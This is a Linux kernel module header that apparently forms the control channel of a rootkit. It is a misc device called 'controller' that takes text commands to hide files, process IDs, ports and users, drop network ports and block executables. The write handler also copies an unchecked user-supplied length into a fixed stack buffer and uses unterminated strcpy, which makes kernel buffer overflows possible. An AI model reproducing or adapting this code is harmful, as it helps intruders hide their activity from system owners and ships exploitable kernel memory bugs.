#ifndef DEVICE_HANDLER
    #define DEVICE_HANDLER

    #include <linux/miscdevice.h> // dev
    #include <linux/sched.h>
    #include <linux/fs.h>
    #include <linux/uaccess.h> // copy to/from user space

    #include "linked_list.h"


#define DEVICE_SIZE 512 // size of possible input in bytes
char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace


ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
{
    if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
        printk("Kernel -> userspace copy failed!\n");
        return -1; // return error
    }
    return strlen(last_data); // return length of data that was copied
}


ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp) // function to get config of what to hide and what type
{
    char tmpdata[DEVICE_SIZE + 1];
    if (copy_from_user(tmpdata, buff, count) != 0) {
        printk("Userspace -> kernel copy failed!\n");
        return -1;
    }
    if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
        if(strlen(tmpdata) > strlen("hide ") + 3){
            strcpy(last_data, tmpdata + strlen("hide "));
            insert_node(&files_to_hide, last_data);
        }
    }
    if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
        if(strlen(tmpdata) > strlen("hidep ")){
            strcpy(last_data, tmpdata + strlen("hidep "));
            insert_node(&pids_to_hide, last_data);
        }
    }
    if(memcmp("hidepo ", tmpdata, strlen("hidepo ")) == 0){
        if(strlen(tmpdata) > strlen("hidepo ")){
            strcpy(last_data, tmpdata + strlen("hidepo "));
            insert_node(&ports_to_hide, last_data);
        }
    }
    if(memcmp("hideu ", tmpdata, strlen("hideu ")) == 0){
        if(strlen(tmpdata) > strlen("hideu ")){
            strcpy(last_data, tmpdata + strlen("hideu "));
            insert_node(&users_to_hide, last_data);
        }
    }
    if(memcmp("hidepd ", tmpdata, strlen("hidepd ")) == 0){
        if(strlen(tmpdata) > strlen("hidepd ")){
            strcpy(last_data, tmpdata + strlen("hidepd "));
            insert_node(&ports_to_drop, last_data);
        }
    }
    if(memcmp("hidee ", tmpdata, strlen("hidee ")) == 0){
        if(strlen(tmpdata) > strlen("hidee ")){
            strcpy(last_data, tmpdata + strlen("hidee "));
            insert_node(&exec_to_block, last_data);
        }
    }
    if(memcmp("show ", tmpdata, strlen("show ")) == 0){
        if(strlen(tmpdata) > strlen("show ") + 3){
            strcpy(last_data, tmpdata + strlen("show "));
            remove_node_by_name(&files_to_hide, last_data);
        }
    }
    if(memcmp("showp ", tmpdata, strlen("showp ")) == 0){
        if(strlen(tmpdata) > strlen("showp ")){
            strcpy(last_data, tmpdata + strlen("showp "));
            remove_node_by_name(&pids_to_hide, last_data);
        }
    }
    if(memcmp("showpo ", tmpdata, strlen("showpo ")) == 0){
        if(strlen(tmpdata) > strlen("showpo ")){
            strcpy(last_data, tmpdata + strlen("showpo "));
            remove_node_by_name(&ports_to_hide, last_data);
        }
    }
    if(memcmp("showu ", tmpdata, strlen("showu ")) == 0){
        if(strlen(tmpdata) > strlen("showu ")){
            strcpy(last_data, tmpdata + strlen("showu "));
            remove_node_by_name(&users_to_hide, last_data);
        }
    }
    if(memcmp("showpd ", tmpdata, strlen("showpd ")) == 0){
        if(strlen(tmpdata) > strlen("showpd ")){
            strcpy(last_data, tmpdata + strlen("showpd "));
            remove_node_by_name(&ports_to_drop, last_data);
        }
    }
    if(memcmp("showe ", tmpdata, strlen("showe ")) == 0){
        if(strlen(tmpdata) > strlen("showe ")){
            strcpy(last_data, tmpdata + strlen("showe "));
            remove_node_by_name(&exec_to_block, last_data);
        }
    }
    return 0;
}


struct file_operations fops = { // file operations on device file, what functions to call when reading/writing
    read: reader,
    write: writer
};

static struct miscdevice controller = { // device configuration in file system and kernel
    .minor = MISC_DYNAMIC_MINOR,
    .name = "controller",
    .fops = &fops
};

#endif
